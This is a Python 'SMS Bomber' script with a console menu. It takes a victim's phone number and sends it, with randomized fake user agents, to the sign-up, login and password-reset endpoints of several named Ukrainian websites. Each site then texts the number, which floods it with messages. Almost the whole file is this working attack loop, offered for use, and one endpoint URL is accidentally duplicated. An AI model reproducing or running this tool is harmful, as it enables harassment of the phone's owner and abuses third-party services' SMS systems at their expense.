import requests, fake_useragent, time, random
from termcolor import colored
import os

os.system('cls' if os.name == 'nt' else 'clear')

print(colored('''
┌─┐ ┌┬┐┌─┬┐┌─┬─┐┌─┐
││└┐││││┌┤││┌┤│└┘││
│┌┐└┘│└┘┘│└┘┘│┌┐┌┐│
││└┐││┌┐││┌┐│││││││
││ │││││└┤││└┤│││││
└┘ └─┴┘└─┴┘└─┴┘└┘└┘
           ''', 'red'), 'UKRAINE')
print('''
[1] SMS Bomber
[2] Help
[3] About

[0] Exit''')
choose = input('Choose: ')

while True:

    #SMS BOMBER
    if choose == "1":
        os.system('cls' if os.name == 'nt' else 'clear')
        phone = input("Enter the number(Without +): ")

        #ИЗМЕНЕНИЕ НОМЕРА ПОД РАЗНЫЕ СЕРВИСЫ
        _phone = phone[2:]
        __phone = '+'+phone[:2]+'('+phone[2:5]+phone[5:5]+')'+phone[5:8]+'-'+phone[8:10]+'-'+phone[10:12]

        cl = int(input("How many seconds will there be between requests?: "))
        while True:
            payload = {'phone': __phone, 'numbers': '4'}
            usr = fake_useragent.UserAgent().random
            header = {'user_agent': usr}


            try:
                requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', headers = header, data = {'phone': phone, 'action': 'ajax_register_user', 'step': '1', 'security_login': 'e14969c2cf'})
                print(colored("[+]", 'green'), "TarantinoFamily sent")

            except:
                print(colored('[-]', "red"), 'TarantinoFamily not sent')

            time.sleep(cl)

            try:
                requests.post('https://mamamia.ua/api/auth/login', headers = header, json = {'phone': _phone})
                print(colored('[+]', 'green'), 'Mamamia sent')
            except:
                print(colored('[-]', 'red'), 'Mamamia not sent')

            time.sleep(cl)

            try:
                requests.post('https://api.sweet.tv/SignupService/SetPhone.json', headers = header, json = {'phone': phone, 'locale': 'uk', 'type': "AT_SWEET_TV_Player", 'versionCode': '1', 'versionString': "2.7.1.8", 'model': "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 YaBrowser/21.3.2.194 Yowser/2.5 Safari/537.36", 'widevine_modular': 'true'})
                print(colored('[+]', 'green'), 'Sweet TV sent')
            except:
                print(colored('[-]', 'red'), 'Sweet TV not sent')

            time.sleep(cl)

            try:
                requests.post('https://riksha.com.ua/check-auth-methodhttps://riksha.com.ua/check-auth-method', headers=header, data = {'phone_number': __phone, 'action_type': 'login'})
                print(colored('[+]', 'green'), 'Riksha sent')
            except:
                print(colored('[-]', 'red'), 'Riksha not sent')

            time.sleep(cl)

            try:
                requests.post('https://be.budusushi.ua/login', headers=header, data = {'LoginForm[username]': _phone})
                print(colored('[+]', 'green'), 'Budusushi sent')
            except:
                print(colored('[-]', 'red'), 'Budusushi not sent')

            time.sleep(cl)

            try:
                requests.post('https://sushiwok.ua/user/phone/validate', headers=header, params=payload)
                print(colored('[+]', 'green'), 'Sushiwok sent')
            except:
                print(colored('[-]', 'red'), 'Sushiwok not sent')

            time.sleep(cl)

            try:
                requests.post('http://eco-food.com.ua/send_password/', headers=header, data={'phone':_phone})
                print(colored('[+]', 'green'), 'Eco-Food sent')
            except:
                print(colored('[-]', 'red'), 'Eco-Food not sent')

            time.sleep(3)

            print('----------------------')
            print(colored('[*]', 'blue'), 'Circle is over')
            print('----------------------')

            exit()

    #ПОМОЩЬ
    elif choose == '2':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''Help:
        This is help
        ''')
        print('''[1] SMS Bomber
[2] Help
[3] About

[0] Exit''')
        choose = input('Choose: ')

    #О НАС
    elif choose == '3':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''About:
    Created by katsume.
    TG: @nlxrd
    Github: github.com/0katsume
        ''')
        print('''[1] SMS Bomber
[2] Help
[3] About

[0] Exit''')
        choose = input('Choose: ')

    #ВЫЙТИ
    elif choose == "0":
        exit()
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(colored('''
Please write 0-3
        ''', 'red'))
        print('''[1] SMS Bomber
[2] Help
[3] About

[0] Exit''')
        choose = input('Choose: ')